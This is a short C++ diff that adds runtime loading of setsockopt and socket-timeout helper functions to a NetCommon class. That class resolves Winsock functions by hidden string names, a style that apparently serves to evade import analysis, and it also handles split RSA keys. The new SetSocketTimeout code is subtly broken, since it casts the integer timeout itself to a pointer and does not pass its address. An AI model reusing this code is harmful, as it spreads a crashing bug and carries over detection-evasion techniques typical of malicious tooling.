@@ -43,6 +43,7 @@ void NetCommon::LoadWSAFunctions() {
     GetHostByName = ProcessManager::GetFunctionAddress<_gethostbyname>(WINSOCK, std::string(HIDE("gethostbyname")));
     HostToNetworkLong = ProcessManager::GetFunctionAddress<_htonl>(WINSOCK, std::string(HIDE("htonl")));
     NetworkToHostLong = ProcessManager::GetFunctionAddress<_ntohl>(WINSOCK, std::string(HIDE("ntohl")));
+    SetSocketOptions = ProcessManager::GetFunctionAddress<_setsocketopt>(WINSOCK, std::string(HIDE("setsockopt")));
 
     WORD    version = MAKEWORD(2, 2);
     WSAData data = { 0 };
@@ -50,6 +51,18 @@ void NetCommon::LoadWSAFunctions() {
     if ( StartWSA(version, &data) == 0 ) {
         WSAInitialized = TRUE;
     }
+}
+
+BOOL NetCommon::ResetSocketTimeout(SOCKET sfd, int type) {
+    return SetSocketTimeout(sfd, 0, type);
+}
+
+BOOL NetCommon::SetSocketTimeout(SOCKET sfd, int timeoutMS, int type) {
+    int result = SetSocketOptions(sfd, SOL_SOCKET, type, ( char* ) timeoutMS, sizeof(timeoutMS));
+    if ( result == SOCKET_ERROR ) 
+        return FALSE;
+    
+    return TRUE;
 }
 
 BYTESTRING NetCommon::MergeSplitRSAKey(std::pair<BYTESTRING, BYTESTRING> splitted) {
